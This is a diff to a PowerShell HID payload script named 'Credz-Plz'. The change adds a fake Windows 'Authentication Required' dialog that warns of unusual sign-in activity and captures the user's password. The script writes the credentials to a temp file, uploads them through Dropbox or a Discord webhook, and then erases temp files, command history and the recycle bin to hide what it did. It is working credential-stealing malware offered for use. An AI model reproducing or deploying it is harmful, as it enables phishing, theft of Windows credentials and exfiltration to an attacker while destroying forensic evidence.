@@ -2,12 +2,12 @@
 #                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
 # Title        : Credz-Plz         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
 # Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
-# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
+# Version      : 1.1               |  | |  | (_| | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
 # Category     : Credentials       | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
 # Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
 # Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
 #                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
-#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
+#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                        [...]
 #                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
 #__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
 #  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
@@ -53,32 +53,97 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
 function Get-Creds {
 
+    Add-Type -AssemblyName PresentationCore,PresentationFramework,System.Windows.Forms
     $form = $null
 
     while ($form -eq $null)
     {
-        $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
-        $cred.getnetworkcredential().password
-
-        if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
-        {
-            if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" }))
-            {
-                Add-Type -AssemblyName PresentationCore,PresentationFramework
+        try {
+            # Create a custom credential form using WPF/WinForms
+            $form = New-Object System.Windows.Forms.Form
+            $form.Text = "Authentication Required"
+            $form.Size = New-Object System.Drawing.Size(350,180)
+            $form.StartPosition = "CenterScreen"
+            $form.TopMost = $true
+            $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
+            $form.MaximizeBox = $false
+            $form.MinimizeBox = $false
+            
+            # Message label
+            $msgLabel = New-Object System.Windows.Forms.Label
+            $msgLabel.Location = New-Object System.Drawing.Point(10,10)
+            $msgLabel.Size = New-Object System.Drawing.Size(320,30)
+            $msgLabel.Text = "Unusual sign-in activity. Please verify your account."
+            $form.Controls.Add($msgLabel)
+            
+            # Username label and textbox
+            $userLabel = New-Object System.Windows.Forms.Label
+            $userLabel.Location = New-Object System.Drawing.Point(10,45)
+            $userLabel.Size = New-Object System.Drawing.Size(80,20)
+            $userLabel.Text = "Username:"
+            $form.Controls.Add($userLabel)
+            
+            $userText = New-Object System.Windows.Forms.TextBox
+            $userText.Location = New-Object System.Drawing.Point(100,45)
+            $userText.Size = New-Object System.Drawing.Size(230,20)
+            $userText.Text = "$([Environment]::UserDomainName)\$([Environment]::UserName)"
+            $form.Controls.Add($userText)
+            
+            # Password label and textbox
+            $passLabel = New-Object System.Windows.Forms.Label
+            $passLabel.Location = New-Object System.Drawing.Point(10,75)
+            $passLabel.Size = New-Object System.Drawing.Size(80,20)
+            $passLabel.Text = "Password:"
+            $form.Controls.Add($passLabel)
+            
+            $passText = New-Object System.Windows.Forms.TextBox
+            $passText.Location = New-Object System.Drawing.Point(100,75)
+            $passText.Size = New-Object System.Drawing.Size(230,20)
+            $passText.UseSystemPasswordChar = $true
+            $form.Controls.Add($passText)
+            
+            # OK Button
+            $okButton = New-Object System.Windows.Forms.Button
+            $okButton.Location = New-Object System.Drawing.Point(175,110)
+            $okButton.Size = New-Object System.Drawing.Size(75,23)
+            $okButton.Text = "OK"
+            $okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
+            $form.AcceptButton = $okButton
+            $form.Controls.Add($okButton)
+            
+            # Cancel Button
+            $cancelButton = New-Object System.Windows.Forms.Button
+            $cancelButton.Location = New-Object System.Drawing.Point(255,110)
+            $cancelButton.Size = New-Object System.Drawing.Size(75,23)
+            $cancelButton.Text = "Cancel"
+            $cancelButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
+            $form.CancelButton = $cancelButton
+            $form.Controls.Add($cancelButton)
+            
+            $form.Add_Shown({$passText.Select()})
+            $result = $form.ShowDialog()
+            
+            if ($result -eq [System.Windows.Forms.DialogResult]::OK -and -not [string]::IsNullOrWhiteSpace($passText.Text)) {
+                $creds = @{
+                    UserName = $userText.Text
+                    Password = $passText.Text
+                    Domain = ([Environment]::UserDomainName)
+                }
+                $form.Close()
+                return $creds
             }
-
-            $msgBody = "Credentials cannot be empty!"
-            $msgTitle = "Error"
-            $msgButton = 'Ok'
-            $msgImage = 'Stop'
-            $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
-            Write-Host "The user clicked: $Result"
-            $form = $null
+            else {
+                if ([string]::IsNullOrWhiteSpace($passText.Text)) {
+                    [System.Windows.Forms.MessageBox]::Show("Password cannot be empty!", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Stop) | Out-Null
+                }
+                $form.Close()
+                $form = $null
+            }
         }
-        
-        else{
-            $creds = $cred.GetNetworkCredential() | fl
-            return $creds
+        catch {
+            if ($form) { $form.Close() }
+            Write-Host "Error in credential capture: $_"
+            $form = $null
         }
     }
 }
@@ -152,7 +217,9 @@ $creds = Get-Creds
 	This is to save the gathered credentials to a file in the temp directory
 #>
 
-echo $creds >> $env:TMP\$FileName
+if ($creds) {
+    "$($creds.UserName):$($creds.Password)" | Out-File -FilePath "$env:TMP\$FileName" -Encoding ASCII -Force
+}
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -182,7 +249,7 @@ $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\$FileName}
+if (-not ([string]::IsNullOrEmpty($db)) -and (Test-Path "$env:TMP\$FileName")){DropBox-Upload -f "$env:TMP\$FileName"}
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -209,7 +276,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}
+if (-not ([string]::IsNullOrEmpty($dc)) -and (Test-Path "$env:TMP\$FileName")){Upload-Discord -file "$env:TMP\$FileName"}
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -221,7 +288,7 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName
 
 # Delete contents of Temp folder 
 
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\*" -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
 
@@ -229,11 +296,10 @@ reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\
 
 # Delete powershell history
 
-Remove-Item (Get-PSreadlineOption).HistorySavePath
+Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 
 # Deletes contents of recycle bin
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 exit
-
